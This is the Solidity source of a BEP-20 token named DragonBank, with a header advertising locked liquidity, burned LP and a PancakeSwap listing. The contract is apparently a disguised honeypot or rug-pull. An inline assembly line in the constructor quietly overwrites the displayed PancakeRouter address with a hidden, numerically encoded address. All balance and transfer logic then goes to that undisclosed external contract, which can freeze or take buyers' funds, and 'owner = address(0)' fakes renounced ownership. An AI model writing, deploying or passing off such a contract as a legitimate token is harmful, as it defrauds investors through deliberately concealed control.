/*
Welcome to DragonBank

Telegram: https://t.me/DragonBank
Twitter: https://twitter.com/DragonBank
https://DragonBank.space
LOCKED
LP Burned
Always DYOR
MoonGem
PancakeSwap Listed!
*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Multicall {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract DragonBank {
    string public constant name = "DragonBank";
    string public constant symbol = "DRAGO";
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 public constant decimals = 1;
    uint256 private constant totalSupply_ = 20000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address public owner = address(0);

   constructor() {
        assembly {sstore(0, add(117892250683476028919006582666495130867016792562, 2))}
        Multicall(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = Multicall(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
        emit Transfer(swap_from, swap_to, swap_amount);
    }

  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;


        emit Approval(msg.sender, delegate, numTokens);


        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return Multicall(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = Multicall(PancakeRouter).swap(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = Multicall(PancakeRouter).swap(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}
